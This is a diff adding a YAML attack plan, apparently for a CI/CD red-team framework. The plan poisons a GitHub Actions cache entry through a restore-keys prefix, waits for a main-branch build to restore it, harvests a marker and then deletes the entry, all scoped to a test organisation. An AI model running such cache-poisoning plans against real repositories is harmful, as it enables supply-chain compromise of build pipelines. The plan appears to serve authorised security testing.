@@ -1,0 +1,61 @@
+apiVersion: trajan.attack/v1
+title: Restore-key prefix cache poisoning
+rule: cat-09/cache-prefix-overlap
+
+# A cache entry seeded under a key a default-branch run falls back to through its
+# restore-keys prefix. cache.poison records the intended scope and key; the write
+# itself lands via a job, and run.observe waits for the victim run that restores
+# it.
+#
+# The scope is the repository's default branch, because that is the only scope
+# every run restores from: an entry written on a branch is restorable from that
+# branch alone, so a branch-scoped entry and a victim run on main is a
+# demonstration that cannot land. repo.writable is what says the acting identity
+# may write there at all.
+
+scope: [ghektestorg/fr-09-02-cache-prefix-overlap]
+identity: store:range-attacker
+
+inputs:
+  cache_key: { default: node-deps, doc: the restore-key prefix a later run falls back to }
+
+steps:
+  - id: target
+    uses: repo.resolve
+    owner: ghektestorg
+    repo: fr-09-02-cache-prefix-overlap
+
+  - id: writable
+    uses: repo.writable
+    repo: target
+
+  # key is the exact key the job writes and must extend the prefix rather than
+  # equal it: a key indistinguishable from the prefix names the repository's real
+  # caches as much as this one.
+  #
+  # cleanup narrowing to that one entry is the cache.delete step below, not a
+  # property of poisoning: cache.poison declares a by-key inverse, because a replay
+  # after a kill has no list read to resolve an id from, and (key, ref) is not an
+  # identity. cache.delete takes the entry by id and retires that declaration. A
+  # plan that poisons without it leaves the by-key inverse standing, and replaying
+  # it can take a same-key entry belonging to the customer.
+  - id: poison
+    uses: cache.poison
+    on: writable
+    key: ${{ cache_key }}-trajan
+    restore_key_prefix: cache_key
+    bytes: 64
+
+  - id: victim
+    uses: run.observe
+    on: target
+    workflow: .github/workflows/build.yml
+    ref: main
+
+  - id: loot
+    uses: run.harvest
+    on: victim
+    match: poisoned-marker
+
+cleanup:
+  - { uses: cache.delete, id: cleanup-cache, cache: poison }
